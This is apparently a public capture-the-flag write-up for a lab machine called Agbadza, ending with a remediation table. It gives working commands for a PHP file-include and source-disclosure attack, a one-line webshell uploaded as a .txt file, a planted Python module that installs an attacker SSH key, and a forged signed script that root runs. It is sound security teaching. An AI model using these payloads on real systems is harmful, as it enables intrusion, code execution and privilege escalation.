# Agbadza — LFI to RCE, then a three-hop root

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/agbadza/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — A PHP community portal exposes an unauthenticated local file
> include (`preview.php?f=`) that doubles as a source-disclosure primitive.
> Combined with an authenticated upload that only blacklists PHP extensions by
> name, it yields RCE as `www-data`. From there the box falls in three hops:
> **www-data → ginawild** via a `PYTHONPATH` hijack of a scheduled job, then
> **ginawild → root** by signing a root-executed script with a private key
> recovered from a stray `.pfx`. Flag: `NCTF{1e71…}`.


## 1. Briefing

### Description
A PHP community portal. The scenario hints that "everything runs on a schedule"
and that administrators sign their maintenance scripts.

### Target
| Field | Value |
|-------|-------|
| Host | `10.100.13.100` (ephemeral lab) |
| Service | PHP web app on port 80 |
| Flag format | `NCTF{...}` |

## 2. Environment & prerequisites
| Tool | Purpose |
|------|---------|
| `curl` | Reconnaissance, LFI, webshell driver |
| directory fuzzer | Endpoint discovery |
| `ssh` / `openssl` | Foothold and privesc |

## 3. Reconnaissance

**Objective:** map endpoints and input handling. Directory fuzzing found
`login.php`, `preview.php`, and `dashboard.php`. `preview.php` takes `f` and
calls `include($f)` after blocking only `..`:

```php
// preview.php (read via php://filter)
$f = $_GET['f'] ?? '';
if ($f === '' || strpos($f, '..') !== false) { die('chemin invalide'); }
include($f);
```

Blocking only `..` leaves `php://filter` wrappers and absolute paths wide open.

## 4. Analysis

Two primitives combine into RCE:

1. **Source disclosure** — `php://filter/convert.base64-encode` reads any PHP
   source, including `login.php` (hardcoded `admin@admin.com` / `admin`) and
   `/start.sh`.
2. **Include-anything** — `include($f)` executes any file the include reaches,
   including an uploaded one, so an upload filter that only rejects PHP *names*
   is useless when the include itself provides execution.

## 5. Exploitation

### Step 1 — LFI + source disclosure + RCE as www-data

```bash
# Read PHP source through the filter wrapper
curl 'http://10.100.13.100/preview.php?f=php://filter/convert.base64-encode/resource=/var/www/html/login.php' | base64 -d

# 1. Login with the disclosed hardcoded creds
curl -c /tmp/c.txt -X POST -d 'u=admin@admin.com&p=admin' http://10.100.13.100/login.php

# 2. Upload a webshell as .txt (dashboard blocks .php/.phtml/.phar by name only)
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.txt
curl -b /tmp/c.txt -F 'f=@/tmp/shell.txt;filename=shell.txt' http://10.100.13.100/dashboard.php

# 3. Execute it through the include
curl 'http://10.100.13.100/preview.php?f=uploads/shell.txt' --get --data-urlencode 'cmd=id'
# uid=33(www-data)
```

### Step 2 — www-data → ginawild (PYTHONPATH hijack)

`/start.sh` (read via LFI) runs a renderer as `ginawild` every 10 seconds with
an attacker-writable `PYTHONPATH`:

```bash
( while true; do
    runuser -u ginawild -- env PYTHONPATH=/srv/share /usr/bin/python3 /opt/bginfo/bginfo.py
    sleep 10
  done ) &
```

`bginfo.py` does `import sevenzip`. `/srv/share` is writable by `www-data`, so a
planted `sevenzip.py` executes as `ginawild` on the next tick:

```python
# /srv/share/sevenzip.py — installs our SSH key for ginawild
import os
PUBKEY = "ssh-ed25519 AAAA...<attacker key>"
def render():
    os.makedirs('/home/ginawild/.ssh', exist_ok=True)
    os.chmod('/home/ginawild/.ssh', 0o700)
    ak = '/home/ginawild/.ssh/authorized_keys'
    open(ak, 'w').write(PUBKEY + '\n')
    os.chmod(ak, 0o600)
    os.chown('/home/ginawild/.ssh', 1000, 1000)
    os.chown(ak, 1000, 1000)
```

```bash
curl -b /tmp/c.txt -F 'f=@sevenzip.py' http://10.100.13.100/dashboard.php
curl 'http://10.100.13.100/preview.php?f=uploads/shell.txt' --get \
  --data-urlencode 'cmd=cp /var/www/html/uploads/sevenzip.py /srv/share/sevenzip.py'
sleep 12
ssh -i /tmp/agbadza_key ginawild@10.100.13.100   # uid=1000(ginawild)
```

### Step 3 — ginawild → root (signed script execution)

`/start.sh` also runs, as root, every 10 seconds:

```bash
# /opt/bpass/run.sh
S=/srv/scripts/Get-bADpasswords.ps1
if [ -f "$S" ] && [ -f "$S.sig" ]; then
    if openssl dgst -sha256 -verify /opt/bpass/admin_pub.pem -signature "$S.sig" "$S"; then
        bash "$S"
    fi
fi
```

`/srv/scripts` is writable by `ginawild`. The matching private key is recoverable:
a `cert.pfx` sits in ginawild's Trash, and its password `Agbadza2024!` is in
`/home/ginawild/passwords.txt`. The legacy PKCS#12 format needs OpenSSL's
`-legacy` flag:

```bash
CERT=~/.local/share/Trash/files/cert.pfx
openssl pkcs12 -legacy -in "$CERT" -nocerts -nodes -passin "pass:Agbadza2024!" > /tmp/key.pem

cat > /srv/scripts/Get-bADpasswords.ps1 << 'EOF'
#!/bin/bash
cp /root/root.txt /srv/share/flag.txt
chmod 644 /srv/share/flag.txt
EOF

openssl dgst -sha256 -sign /tmp/key.pem -out /srv/scripts/Get-bADpasswords.ps1.sig \
  /srv/scripts/Get-bADpasswords.ps1
sleep 12
cat /srv/share/flag.txt
```

The signature verifies against `admin_pub.pem`, root runs the script, and it
copies the flag to a world-readable path.

## 6. Flag

```
NCTF{1e71…}
```

## 7. Dead ends & troubleshooting
- The upload filter tempts you toward exotic PHP extensions; unnecessary, since
  the LFI provides execution for any uploaded file.
- `openssl pkcs12` fails without `-legacy` on recent OpenSSL (the `.pfx` uses
  RC2/3DES) — the error reads like a wrong password and sends you chasing the
  wrong thing.

## 8. Lessons & remediation
| Weakness | Root cause | Fix |
|----------|-----------|-----|
| LFI + source disclosure | `include()` on user input, only `..` filtered | Whitelist allowed files; never `include` request-controlled paths; disable `allow_url_include`, restrict stream wrappers |
| Webshell upload | Extension blacklist by name | Whitelist content types, store uploads outside the web root, never include them |
| www-data → ginawild | Writable dir on `PYTHONPATH` of a scheduled job | Pin `PYTHONPATH` to trusted, non-writable paths; run jobs from read-only trees |
| ginawild → root | Private key + its password left on disk | Never ship signing keys/passwords on the host; verify provenance, not just a signature over attacker-writable input |
